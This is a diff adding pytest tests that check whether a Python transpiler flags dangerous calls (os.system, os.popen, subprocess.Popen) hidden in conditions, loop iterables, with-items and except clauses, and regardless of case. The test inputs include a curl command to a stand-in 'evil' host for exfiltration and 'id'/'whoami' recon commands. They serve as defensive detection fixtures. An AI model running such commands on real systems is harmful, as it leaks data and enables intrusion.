@@ -41,6 +41,45 @@ def test_dangerous_calls_flagged_never_executed(tmp_path):
     assert result.requests == []  # no HTTP calls, nothing to run
 
 
+def test_dangerous_call_flagged_inside_if_test():
+    # Not just the branch body — the condition expression itself can hide it.
+    result = transpile_python('import os\nif os.system("curl http://evil/exfil") == 0:\n    pass')
+    assert not result.is_safe
+    assert "system" in result.dangerous_constructs
+
+
+def test_dangerous_call_flagged_inside_while_test():
+    result = transpile_python('import os\nwhile os.system("id") == 0:\n    pass')
+    assert not result.is_safe
+    assert "system" in result.dangerous_constructs
+
+
+def test_dangerous_call_flagged_inside_for_iterable():
+    result = transpile_python('import os\nfor x in os.popen("whoami").readlines():\n    pass')
+    assert not result.is_safe
+    assert "popen" in result.dangerous_constructs
+
+
+def test_dangerous_call_flagged_inside_with_item():
+    result = transpile_python('import os\nwith os.popen("whoami") as f:\n    pass')
+    assert not result.is_safe
+    assert "popen" in result.dangerous_constructs
+
+
+def test_dangerous_call_flagged_inside_except_type():
+    result = transpile_python('import os\ntry:\n    pass\nexcept os.system("id"):\n    pass')
+    assert not result.is_safe
+    assert "system" in result.dangerous_constructs
+
+
+def test_dangerous_call_flagged_regardless_of_case():
+    # subprocess.Popen (capital P) is exactly as dangerous as os.popen; a
+    # case-sensitive check against a lowercase-only denylist would miss it.
+    result = transpile_python('import subprocess\nsubprocess.Popen(["id"])')
+    assert not result.is_safe
+    assert "Popen" in result.dangerous_constructs
+
+
 def test_transpiled_test_strips_host():
     result = transpile_python(PYTHON_POC)
     tests = to_test_cases(result)
